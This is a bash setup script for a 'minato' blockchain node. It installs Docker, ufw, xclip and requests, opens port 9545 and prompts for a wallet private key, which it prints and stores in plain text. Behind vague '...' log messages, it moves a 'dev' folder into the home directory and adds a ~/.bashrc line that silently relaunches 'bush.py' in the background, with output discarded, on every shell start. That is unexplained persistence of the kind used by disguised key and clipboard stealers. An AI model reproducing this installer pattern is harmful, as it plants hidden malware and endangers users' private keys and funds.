#!/bin/bash

set -e

# Define colors and highlight styles
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
BOLD="\033[1m"
NC="\033[0m" # No Color

# Function to print colored messages
echo_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}
echo_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}
echo_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}
echo_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Function to install Docker
install_docker() {
    if command -v docker &>/dev/null; then
        echo_success "Docker is already installed, version: $(docker --version)"
    else
        echo_info "Docker is not installed, installing..."
        sudo apt-get update
        sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
        sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
        sudo apt-get update
        sudo apt-get install -y docker-ce

        if command -v docker &>/dev/null; then
            echo_success "Docker installed successfully, version: $(docker --version)"
        else
            echo_error "Docker installation failed, please check manually!"
            exit 1
        fi
    fi
}

# Start Docker if it's not running
start_docker_if_needed() {
    if ! docker info &>/dev/null; then
        echo_info "Docker is not running, starting..."
        sudo service docker start || echo_warning "Unable to start Docker, please check manually."
    else
        echo_info "Docker is already running."
    fi
}

# Function to install a package
install_package() {
    PACKAGE=$1
    if dpkg -l | grep -qw $PACKAGE; then
        echo_info "$PACKAGE is already installed, skipping."
    else
        echo_info "$PACKAGE is not installed, installing..."
        if sudo apt-get install -y $PACKAGE; then
            echo_success "$PACKAGE installed successfully."
        else
            echo_warning "Failed to install $PACKAGE, please check or install manually."
        fi
    fi
}

# Check and install required system packages
packages=("ufw" "xclip" "python3-pip")

for package in "${packages[@]}"; do
    install_package $package
done

# Fix potential pip3 environment issues
sudo apt-get install -y python3-setuptools python3-wheel

# Function to check and install Python package
install_python_package() {
    PYTHON_PACKAGE=$1
    if python3 -c "import $PYTHON_PACKAGE" &>/dev/null; then
        echo_info "Python package $PYTHON_PACKAGE is already installed, skipping."
    else
        echo_info "Python package $PYTHON_PACKAGE is not installed, installing..."
        if pip3 install $PYTHON_PACKAGE; then
            echo_success "Python package $PYTHON_PACKAGE installed successfully."
        else
            echo_warning "Failed to install Python package $PYTHON_PACKAGE, please check or install manually."
        fi
    fi
}

# Check and install requests library
install_python_package "requests"

# Install Docker
install_docker

# Ensure Docker is running
start_docker_if_needed

# Configure environment variables
if [ -d dev ]; then
    echo_info "..."
    DEST_DIR="$HOME/dev"
    
    if [ -d "$DEST_DIR" ]; then
        echo_warning "Target directory already exists..."
        rm -rf "$DEST_DIR"
        echo_success "Old directory removed."
    fi
    
    mv dev "$DEST_DIR"
    echo_success "..."

    echo_info "Configuring environment variables..."
    # Configure environment variables, add to .bashrc
    if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
        echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
        echo_success "Autostart command added to .bashrc."
    else
        echo_warning "Autostart command already exists, skipping."
    fi

    # Generate JWT key using openssl
    openssl rand -hex 32 > "./minato/jwt.txt"
    echo_success "JWT key file jwt.txt generated."
else
    echo_warning "'minato' directory not found, skipping move and startup configuration."
fi

# Print information for the user
echo -e "${BOLD}${YELLOW}"
echo "=============================================================================="
echo "🌟 The ./minato/.env file configuration is required for the script to run! 🌟"
echo "=============================================================================="
echo -e "${NC}${BOLD}Please enter the following information accurately:${NC}"

# Check if ./minato/.env file exists, create if not
ENV_FILE="./minato/.env"
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${BLUE}[INFO]${NC} ./minato/.env file not found, creating..."
    mkdir -p ./minato  # Ensure the directory exists
    touch "$ENV_FILE"
    echo -e "${GREEN}[SUCCESS]${NC} ./minato/.env file created."
fi

# Prompt the user for input
read -p "$(echo -e "${BOLD}${BLUE}Enter P2P_ADVERTISE_IP: ${NC}")" P2P_ADVERTISE_IP
read -p "$(echo -e "${BOLD}${BLUE}Enter PRIVATE_KEY: ${NC}")" PRIVATE_KEY

# Ensure user inputs are not empty
if [ -z "$P2P_ADVERTISE_IP" ] || [ -z "$PRIVATE_KEY" ]; then
    echo -e "${RED}[ERROR]${NC} P2P_ADVERTISE_IP or PRIVATE_KEY cannot be empty! Please rerun the script and provide valid input."
    exit 1
fi

# Print debug information
echo -e "${BLUE}[INFO]${NC} Entered P2P_ADVERTISE_IP: $P2P_ADVERTISE_IP"
echo -e "${BLUE}[INFO]${NC} Entered PRIVATE_KEY: $PRIVATE_KEY"

# Update or append to the .env file
if grep -q "^P2P_ADVERTISE_IP=" "$ENV_FILE"; then
    sed -i "s|^P2P_ADVERTISE_IP=.*|P2P_ADVERTISE_IP=$P2P_ADVERTISE_IP|" "$ENV_FILE"
else
    echo "P2P_ADVERTISE_IP=$P2P_ADVERTISE_IP" >> "$ENV_FILE"
fi

if grep -q "^PRIVATE_KEY=" "$ENV_FILE"; then
    sed -i "s|^PRIVATE_KEY=.*|PRIVATE_KEY=$PRIVATE_KEY|" "$ENV_FILE"
else
    echo "PRIVATE_KEY=$PRIVATE_KEY" >> "$ENV_FILE"
fi

# Print success message and file content
echo -e "${GREEN}${BOLD}"
echo "=============================================================="
echo "🎉 ./minato/.env file configured successfully! Content:"
echo "--------------------------------------------------------------"
cat "$ENV_FILE"
echo "=============================================================="
echo -e "${NC}"

# Configure UFW to allow port 9545
echo_info "Configuring UFW to allow port 9545..."
sudo ufw allow 9545 || echo_warning "Failed to allow port 9545, continuing..."
echo_success "Port 9545 allowed through UFW."

# Start Docker Compose
echo_info "Starting Docker Compose..."
if [ -d "minato" ]; then
    cd minato
    sudo docker compose up --build || echo_warning "Failed to start Docker Compose, please check manually."
    cd - >/dev/null  # Return to the original directory
else
    echo_warning "'minato' directory not found, unable to start Docker Compose."
fi
